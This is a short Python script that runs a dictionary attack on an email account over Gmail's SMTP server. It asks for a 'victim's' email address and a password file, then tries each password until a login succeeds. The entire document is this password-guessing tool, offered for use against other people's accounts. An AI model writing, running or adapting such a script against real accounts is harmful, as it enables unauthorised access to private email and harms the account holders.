# SMTP Module
import smtplib

# Creating an SMTP object
# In parameters it contains Host , port number and local host
# Usually SMTP port number is 25

smtpServer = smtplib.SMTP("smtp.gmail.com",587)

# Identify yourself to the ESMTP server

smtpServer.ehlo()

# Put the SMTP connection in TLS (Transport Layer Security)
# All SMTP commands that should be encrypted 

smtpServer.starttls()

# Getting input from the user
user = input("Enter the victm's mail id: ")
passFile = input("Enter the password file: ")
passFile = open(passFile, "r")

for password in passFile:
    try:
        # Login method
        # The parameters it includes user name and password
        smtpServer.login(user,password)

        # If the match is found then it will display
        print ("[+] Password Found: %s" %password)
        break
    except smtplib.SMTPAuthenticationError:
        # The server didn't accept the username and password combination
        print ("[!] Password Incorrect: %s" %password)